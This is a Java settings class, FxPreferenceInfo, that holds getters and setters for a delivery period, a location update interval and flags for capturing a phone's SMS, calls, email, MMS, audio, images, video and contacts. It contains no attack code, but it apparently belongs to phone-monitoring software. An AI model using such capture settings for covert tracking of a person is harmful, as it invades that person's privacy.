package com.vvt.base;

/**
 * @author Aruna
 * @version 1.0
 * @created 13-Jul-2011 10:52:39
 */

/**
 * Provides application preference based information
 */

public class FxPreferenceInfo {

	private double m_DeliveryPeriodHours;
	private int m_MaxEvents;
	private int m_LocationUpdateInterval;
	private boolean m_CaptureCallLog;
	private boolean m_CaptureSms;
	private boolean m_CaptureEmail;
	private boolean m_CaptureMms;
	private boolean m_CaptureAudio;
	private boolean m_CaptureImage;
	private boolean m_CaptureVideo;
	private boolean m_CaptureAddressBook;
	private boolean m_CaptureWallpaper;
	private boolean m_CaptureEnabled;

	/**
	 * 
	 * @param deliveryPeriodHours
	 *            deliveryPeriodHours
	 */
	public void setDeliveryPeriod(double deliveryPeriodHours) {
		m_DeliveryPeriodHours = deliveryPeriodHours;
	}

	public double getDeliveryPeriod() {
		return m_DeliveryPeriodHours;
	}

	/**
	 * 
	 * @param maxEvents
	 *            maxEvents
	 */
	public void setMaxEvents(int maxEvents) {
		m_MaxEvents = maxEvents;
	}

	public int getMaxEvents() {
		return m_MaxEvents;
	}

	/**
	 * 
	 * @param locationUpdateInterval
	 *            locationUpdateInterval
	 */
	public void setlocationUpdateInterval(int locationUpdateInterval) {
		m_LocationUpdateInterval = locationUpdateInterval;
	}

	public int getlocationUpdateInterval() {
		return m_LocationUpdateInterval;
	}

	public boolean getCaptureSms() {
		return m_CaptureSms;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureSms(boolean capture) {
		m_CaptureSms = capture;
	}

	public boolean getCaptureCallLog() {
		return m_CaptureCallLog;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureCallLog(boolean capture) {
		m_CaptureCallLog = capture;
	}

	public boolean getCaptureEmail() {
		return m_CaptureEmail;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureEmail(boolean capture) {
		m_CaptureEmail = capture;
	}

	public boolean getCaptureMms() {
		return m_CaptureMms;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureMms(boolean capture) {
		m_CaptureMms = capture;
	}

	public boolean getCaptureAudio() {
		return m_CaptureAudio;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureAudio(boolean capture) {
		m_CaptureAudio = capture;
	}

	public boolean getCaptureImage() {
		return m_CaptureImage;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureImage(boolean capture) {
		m_CaptureImage = capture;
	}

	public boolean getCaptureVideo() {
		return m_CaptureVideo;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureVideo(boolean capture) {
		m_CaptureVideo = capture;
	}

	public boolean getCaptureAddressBook() {
		return m_CaptureAddressBook;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureAddressBook(boolean capture) {
		m_CaptureAddressBook = capture;
	}

	public boolean getCaptureWallpaper() {
		return m_CaptureWallpaper;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureWallpaper(boolean capture) {
		m_CaptureWallpaper = capture;
	}

	/**
	 * 
	 * @param capture
	 */
	public void setCaptureEnabled(boolean capture) {
		m_CaptureEnabled = capture;
	}

	public boolean getCaptureEnabled() {
		return m_CaptureEnabled;
	}

}